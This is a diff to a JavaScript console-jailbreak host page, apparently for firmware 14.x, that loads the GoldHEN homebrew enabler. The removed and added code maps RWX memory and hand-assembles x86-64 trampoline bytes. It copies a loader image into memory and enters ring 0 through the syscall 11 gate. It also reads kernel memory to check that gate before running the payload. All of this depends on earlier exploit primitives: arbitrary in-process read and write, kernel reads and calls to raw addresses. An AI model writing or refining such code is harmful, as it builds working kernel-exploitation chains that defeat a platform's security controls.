@@ -28,7 +28,6 @@
       bufAddr(arrayBuffer)  int64 address of the backing store
       p.read1/4/8           read in this process
       p.write1/4/8          write in this process
-      p.readInto(u8, at, n)
       keepAlive             array, so our buffers survive the collector
       mark(tag, detail)     log
     A way to call native code is NOT needed.
@@ -1210,101 +1209,6 @@ async function runPatchSet(room) {
   return true;
 }
 
-const GHL = {
-  base: 0x926200000, size: 291808,
-  tor: 0x47c00, tram: 0x47c40, sentinel: 0x5758,
-};
-
-async function loadGoldhenLoader(url, k, kbase, preloaded) {
-  const c = host();
-  let blob = preloaded || null;
-  if (blob === null) blob = await fetchBytes(url, "g");
-  if (blob === null) return false;
-  if (blob.length !== GHL.size) {
-    say("[g] " + blob.length + " bytes, expected the loader image's " + GHL.size);
-    return false;
-  }
-  if (blob[0] !== 0xe9) { say("[g] no entry jmp at 0 -- not the loader image"); return false; }
-
-  const size = (blob.length + 0xfff) & ~0xfff;
-  const lo32 = GHL.base % 0x100000000, hi32 = Math.floor(GHL.base / 0x100000000);
-  const base = v(lo32, hi32);
-  /* a hint, not MAP_FIXED: if 0x926200000 is already taken the mmap moves
-     instead of unmapping what is there, and the check below catches it */
-  const m = sc(S.mmap, base, size + 0x1000, 3, 0x1002, -1, 0);
-  if (m.i32 === -1) { say("[g] mmap failed, errno " + c.errno()); return false; }
-  if ((m.lo >>> 0) !== lo32 || (m.hi >>> 0) !== hi32) {
-    say("[g] mmap came back at " + text(v(m.lo, m.hi)) + ", not 0x" + GHL.base.toString(16)
-        + " -- the loader addresses its own data absolutely, refusing");
-    return false;
-  }
-  for (let o = 0; o <= size; o += 0x1000) wr4(plus(base, o), 0);
-  if (sc(S.mprotect, base, size + 0x1000, 7).i32 !== 0) {
-    say("[g] mprotect rwx failed, errno " + c.errno()); return false;
-  }
-
-  /* the userland side of the gate, exactly as the composite path uses it */
-  codeAt(base, GHL.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
-
-  /* ring 3 probe before ring 0 is sent in there: a plain ret, so a page
-     without X kills this process and not the console */
-  codeAt(base, GHL.tram + 0x200).hex("c3");
-  const r3 = c.callAddr(plus(base, GHL.tram + 0x200), []);
-  if (r3 === undefined || r3 === null) {
-    say("[g] the mapping does not execute -- stopping");
-    return false;
-  }
-
-  /* One address object and one value object, mutated in place. A fresh int64
-     per quadword here left ~a million short-lived cells for the collector,
-     which ran right after the install -- after "done", with the payload
-     already in the kernel. */
-  const cur = plus(base, 0);
-  const word = v(0, 0);
-  for (let o = 0; o < blob.length; o += 8) {
-    let lo = 0, hi = 0;
-    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-    word.low = lo >>> 0; word.hi = hi >>> 0;
-    c.p.write8(cur, word);
-    cur.add32inplace(8);
-  }
-  const back = new Uint8Array(0x1000);
-  for (let o = 0; o < blob.length;) {
-    const n = Math.min(back.length, blob.length - o);
-    c.p.readInto(back, plus(base, o), n);
-    for (let i = 0; i < n; i++) {
-      if (back[i] !== blob[o + i]) {
-        say("[g] copy mismatch at 0x" + (o + i).toString(16)); return false;
-      }
-    }
-    o += n;
-  }
-  say("[g] " + blob.length + " bytes at 0x" + GHL.base.toString(16));
-
-  const tram = { n: 0 };
-  const b1 = function (x) { wr1(plus(base, GHL.tram + tram.n), x); tram.n++; };
-  const hex = function (h) { const u = unhex(h); for (let i = 0; i < u.length; i++) b1(u[i]); };
-  const i32 = function (n) { for (let k = 0; k < 4; k++) b1(Math.floor(n / Math.pow(256, k)) % 256); };
-  const q64 = function (q) { i32(q.low >>> 0); i32(q.hi >>> 0); };
-
-  tram.n = 0;
-  hex("48bf"); q64(kbase);        /* rdi = kernel base: any kernel pointer passes the entry check */
-  hex("48b8"); q64(base);         /* rax = the loader's first byte, a jump to its entry */
-  hex("ffd0");                    /* call rax */
-  hex("b8"); i32(GHL.sentinel);   /* mov eax, sentinel */
-  hex("c3");
-  const rr = c.callAddr(plus(base, GHL.tor), [11, plus(base, GHL.tram)]);
-  const rl = rr && (rr.lo >>> 0);
-  if (rl !== GHL.sentinel) {
-    say("[g] the loader call returned " + (rr ? "0x" + rl.toString(16) : "nothing")
-        + " -- still running, or it faulted");
-    return false;
-  }
-  say("[g] the loader returned -- banner and install lines follow in klog 3232");
-  return true;
-}
-
 /* Which loader runs is decided by the CONTENT, not by the file name. There
    are two forms and they look alike from outside:
      - composite image: stub area plus payload at 0x50000, exactly
@@ -1318,11 +1222,19 @@ async function loadEnabler(url, k, kbase, room) {
   const blob = await fetchBytes(url, "e");
   if (blob === null) return false;
   if (blob.length === GHL.size) {
-    say("[e] " + blob.length + " bytes -- GoldHEN loader image, entered in ring 0 at its base");
+    say("[e] " + blob.length + " bytes -- GoldHEN loader image, raw payload path");
     /* No host patch set here. This image's kpayload installs its own kernel
        patches and custom syscalls. On 14.02 the host set's 0x125xxx block is
        unverified, and writing it blind is what killed the last run. */
-    return loadGoldhenLoader(url, k, kbase, blob);
+    /* The loader's entry enters ring 0 through sysent[11], so the door is
+       checked before a thread is sent through it. */
+    const door = k.read_v(plus(kbase, 0x1102d88));
+    if (!door || !same(door, plus(kbase, 0xab4))) {
+      say("[e] sysent[11] is " + (door ? text(door) : "unreadable")
+          + ", not the kexec door at +0xab4 -- the loader would enter nothing");
+      return false;
+    }
+    return loadPayload(url, blob);
   }
   if (blob.length === GH.nlOff + GH.nlLen) {
     say("[e] " + blob.length + " bytes -- composite image, patch chain path");
@@ -1369,20 +1281,27 @@ async function loadPayload(url, preloaded) {
     say("[p] mmap rwx failed, errno " + c.errno()); return false;
   }
 
+  /* One address object and one value object, mutated in place: this copy is
+     a quarter of a megabyte and a fresh int64 per quadword left the page
+     with a million cells to collect right after the install. */
+  const cur = v(entry.low, entry.hi);
+  const word = v(0, 0);
   for (let o = 0; o < blob.length; o += 8) {
     let lo = 0, hi = 0;
     for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
     for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-    c.p.write8(plus(entry, o), v(lo >>> 0, hi >>> 0));
+    word.low = lo >>> 0; word.hi = hi >>> 0;
+    c.p.write8(cur, word);
+    cur.add32inplace(8);
   }
-  for (let o = 0; o < blob.length; o += 8) {
-    let lo = 0, hi = 0;
+  const back = v(entry.low, entry.hi);
+  for (let o = 0; o < blob.length; o += 4) {
+    let lo = 0;
     for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-    const q = c.p.read8(plus(entry, o));
-    if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
+    if (c.p.read4(back) !== (lo >>> 0)) {
       say("[p] copy mismatch at 0x" + o.toString(16)); return false;
     }
+    back.add32inplace(4);
   }
 
   /* The table blanks both pthread_create fields for 14.00, but only one of
@@ -1698,6 +1617,25 @@ async function loadGoldhen(url, k, kbase, room, preloaded) {
   say("[g] " + good + " of " + GH_STEPS.length + " calls returned, " + silent + " silent");
   return silent === 0;
 }
+
+/* ------------------------------------------ GoldHEN loader image */
+
+/* The other GoldHEN form this page accepts: the OpenGoldHEN loader. It is a
+   raw payload in the host's sense -- first byte e9, run from a thread at
+   whatever address the mmap chose -- and it carries everything it needs in
+   that one file: the loader, the zlib kpayload and their trailer.
+
+   Nothing in it is tied to a fixed address. Its entry stub is at image
+   offset 0, so the base it is running from is its own address; every
+   internal literal is reached relative to that base, and the entry bootstrap
+   enters ring 0 through the syscall 11 gate before any of it runs.
+
+   No step chain here. The loader finds the kernel itself through rdmsr,
+   patches the installer (it saves and restores CR0.WP around the writes),
+   inflates the kpayload that follows it in the same image, loads that ELF
+   and calls its entry. The kpayload installs its own kernel patches and
+   custom syscalls, so the host's patch set is not run for this form. */
+const GHL = { size: 292704 };
 
 /* ------------------------------------------------- defusing the handles */
 
